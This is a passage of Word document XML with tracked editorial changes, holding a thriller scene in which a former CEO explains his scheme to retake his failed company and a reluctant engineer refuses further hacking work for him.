          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>did</w:t>
      </w:r>
      <w:ins w:id="2240" w:author="TextVet" w:date="2016-03-22T14:42:00Z">
        <w:r w:rsidR="00090911">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">learn a lot — enough to know my way around the dot-com world as an investor and venture capitalist. But with Tungsten, there was nothing I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>could do to keep it afloat. I managed its operations, and it withered and died in my arms. The world moves fast, Danny. You know that as well as anyone.”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began to relax. “So you’re not in it for revenge. And you keep talking about your severance package and your dot-com investment stuff, so I assume you’re not in it for the money. So what </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2241" w:author="TextVet" w:date="2016-03-22T14:43:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> you doing all this for?”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“Redemption.”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said nothing.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“My marriage fell apart, Danny. My kids hate me now. I haven’t talked to my ex-wife in years. And through the divorce and everything, it was all okay because… I mean, it wasn’t</w:t>
      </w:r>
      <w:ins w:id="2242" w:author="TextVet" w:date="2016-03-22T14:43:00Z">
        <w:r w:rsidR="006137E4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>okay</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, obviously, but… at least I always had my work. I spent my lifetime building Tungsten, and it died on my watch. And now I need to find a way to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>undo</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that. To prove that I can make it work after all — the thing I’ve poured my whole life into. I need to prove that I can do </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>something</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that doesn’t end in disaster and disappointment. That I’m not…” He </w:t>
      </w:r>
      <w:ins w:id="2243" w:author="TextVet" w:date="2016-03-29T14:46:00Z">
        <w:r w:rsidR="00F65EB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>didn’t finish</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2244" w:author="TextVet" w:date="2016-03-29T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F65EB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>cut himself off before finishing the sentenc</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2245" w:author="TextVet" w:date="2016-03-29T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F65EB7">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2246" w:author="TextVet" w:date="2016-03-29T14:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B77F52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Danny asked, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“How does stealing their intellectual property help anything?”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 all has to do with a little problem with Tungsten’s paperwork,” </w:t>
      </w:r>
      <w:del w:id="2247" w:author="TextVet" w:date="2016-03-29T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B77F52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2248" w:author="TextVet" w:date="2016-03-29T14:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B77F52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">id </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Jason</w:t>
      </w:r>
      <w:ins w:id="2249" w:author="TextVet" w:date="2016-03-29T14:51:00Z">
        <w:r w:rsidR="00B77F52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> replied</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “that presents me with an interesting opportunity.” He hesitated before elaborating. “Danny, I was always totally honest when it came to Tungsten’s accounts. I swear</w:t>
      </w:r>
      <w:del w:id="2250" w:author="TextVet" w:date="2016-03-29T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E07AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. I never cooked the books. I never did any insider trading. Never. But… near the end there, with Tungsten circling the drain, I guess I just stopped caring… And I’ll admit I… got sloppy.”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said nothing. He didn’t need to.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“Tungsten never formally declared bankruptcy,” Jason explained. “We never actually filed Chapter 11. We </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>started</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the paperwork, of course. But I… never finished it. Now, most of our creditors, they just </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>assumed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that the filing went through, and, well… I never corrected them. So, they wrote off their investments in Tungsten as capital losses. When the creditors listed those write</w:t>
      </w:r>
      <w:ins w:id="2251" w:author="TextVet" w:date="2016-03-22T14:45:00Z">
        <w:r w:rsidR="00455BB4">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offs in their year-end tax filings, we treated that as </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ipso facto</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> forgiveness of the debt, and cleared the balances from our ledgers. But both the write-offs and the debt forgiveness were based on misunderstandings — arguably </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>willful</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> misunderstandings — and neither would hold up in a court of law.”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“So, what you mean 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I mean,” said Jason, “is that Tungsten is carrying almost a hundred million dollars in unsettled debt, with compounding interest. When this Eastern European consortium bought that company, they unknowingly bought a bottomless money pit.”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“Then who are all these people you’re calling now?”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“They’re some of our old creditors,” said Jason. “I’ve been in contact with them. Several weeks ago, I casually informed them about Tungsten’s lack of legally filed bankruptcy paperwork. They found the news very troubling.”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merely shook his head with incredulity.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“Tungsten’s assets are rightly theirs, you see,” Jason clarified. “The creditors are still entitled to come and collect. They can legally force Tungsten to sell off everything it owns and divvy up the money among them. And that’s what they were ready to do when I first told them about Tungsten’s little paperwork snafu. Their natural reflex is to put everything on the auction block and recoup whatever they can,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chuckled bitterly. “Like what you just did to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> company, Claymore Communications. I’m seeing a pattern here. As above, so below?”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all just business,” Jason replied. “But with Tungsten there’s more to it now. See, an auction of Tungsten’s assets would barely net a few million dollars at most. Tungsten’s lenders thought most of the company’s capital was tied up in the stockroom where they keep all the inventory, and the stuff in there is obsolete and getting progressively worthless. But Tungsten’s not a medical supply house anymore. It’s a biotechnology research firm now. And thanks to this nameless Eastern European consortium, Tungsten now has something that could be worth serious money.”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this whole mission tonight,” Danny followed, “was to provide proof that Tungsten is worth keeping. That it shouldn’t be disbanded, but kept around in its new form.”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“Exactly,” said Jason. “This consortium, whoever they are, was kind enough to find a way to do what I couldn’t: turn Tungsten around. Give it potential. Give it life. Give it relevance.”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“Uh-huh. And you’re going to reward them for their efforts by getting Tungsten’s old investors to swoop in and take it back from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shrugged. “It is what it is,” he said distantly.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what’s in it for you?” Danny asked pointedly.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new investment group I’ve set up consists solely of international creditors,” </w:t>
      </w:r>
      <w:del w:id="2252" w:author="TextVet" w:date="2016-03-22T14:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005C0E0B">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Jason</w:t>
      </w:r>
      <w:ins w:id="2253" w:author="TextVet" w:date="2016-03-22T14:50:00Z">
        <w:r w:rsidR="005C0E0B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> stated</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “I’ve made a deal with them. See, they’re going to need a new President and CEO. Someone local. Someone who’s been in the business his whole life. Someone who knows American corporate practices and who has experience running a company like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“Right,” Danny s</w:t>
      </w:r>
      <w:del w:id="2254" w:author="TextVet" w:date="2016-03-29T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007765D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aid with a s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nort</w:t>
      </w:r>
      <w:ins w:id="2255" w:author="TextVet" w:date="2016-03-29T14:54:00Z">
        <w:r w:rsidR="007765D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “And, naturally, who better to take the reins than someone who not only has experience running a company </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>like</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> this, but actually running </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:ins w:id="2256" w:author="TextVet" w:date="2016-03-22T14:51:00Z">
        <w:r w:rsidR="000E65D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>company…”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“Exactly!”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ins w:id="2257" w:author="TextVet" w:date="2016-03-29T14:54:00Z">
        <w:r w:rsidR="004C3E26">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>I</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2258" w:author="TextVet" w:date="2016-03-29T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C3E26">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nto the ground,” Danny finished.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 angry glare flashed momentarily across Jason’s face. But in a blink, the middle-aged man pushed the rage away, and turned to gaze at the road ahead. He nodded humbly, and squared his jaw. “Not this time,” he said. “Not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time.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E65D1" w:rsidRDefault="000E65D1" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="2259" w:author="TextVet" w:date="2016-03-22T14:52:00Z"/>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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sight of his house</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> made Danny giddy with relief. The red pickup truck worked its way, Pac Man-like, through the grid of streets in the University District, until it finally came to park on the curb outside Danny’s front yard. The one-story structure, with its blue siding and brown roof and white door and attached two-car garage, had never looked so inviting. In his mind, Danny was already heading to his bedroom.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“I’ll send your payment by PayPal tomorrow,” Jason</w:t>
      </w:r>
      <w:ins w:id="2260" w:author="TextVet" w:date="2016-03-22T14:53:00Z">
        <w:r w:rsidR="000E65D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2261" w:author="TextVet" w:date="2016-03-22T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E65D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> said with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tired voice</w:t>
      </w:r>
      <w:ins w:id="2262" w:author="TextVet" w:date="2016-03-22T14:54:00Z">
        <w:r w:rsidR="000E65D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> promised</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collected his HERF gun, carefully examining the torn power cables. “My payment?”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“For your services tonight,” Jason said. “You’ve sure as hell earned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Right,” he replied, taking off his seatbelt. “Yes, thanks.”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I’ll call you tomorrow to discuss the consortium?”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froze with his hand on the door handle. “What’s there to discuss?”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really would like to find out who they are,” said Jason. “I’ll pay you for the additional labor, of course.”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slumped back into his seat with an intense frown. “I don’t want to do this anymore, alright?”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Danny, I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>need</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you…” Jason insisted.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not a hacker, Jason,” Danny replied. “This is Seattle. There’s dozens of top-notch hacker outfits you could hire, both legal and illegal. IOActive. Leviathan Security. The Ghetto Hackers. The Schmoo Group. There’s literally a thousand people in this city that would do a better job at this than me, for a lower price.”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I don’t have any inroads to folks like that,” Jason defended. “It’s not like I can just type ‘Seattle hackers’ into Google and get contact information for…”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you can,” Danny interrupted. “You can do </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exactly</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that. Try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“Right. And I’m supposed to work with some random guy off the Internet who happens to be a semi-professional criminal?”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glared at him. “For a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>criminal</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> activity?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need someone smart who could do the job,” Jason countered.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you thought </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> would be the right guy for it?” Danny fired back. “I’m an engineer. I’m a builder, not a breaker. All this cloak-and-dagger bullshit isn’t what I do.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is what I do…” He held up his HERF gun.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is what I do…” He held up his cellphone. “I don’t do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He fished Eugene’s hacked Pantech out of his pocket. “…And I sure as shit don’t do</w:t>
      </w:r>
      <w:ins w:id="2263" w:author="TextVet" w:date="2016-03-22T14:56:00Z">
        <w:r w:rsidR="005A0400">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
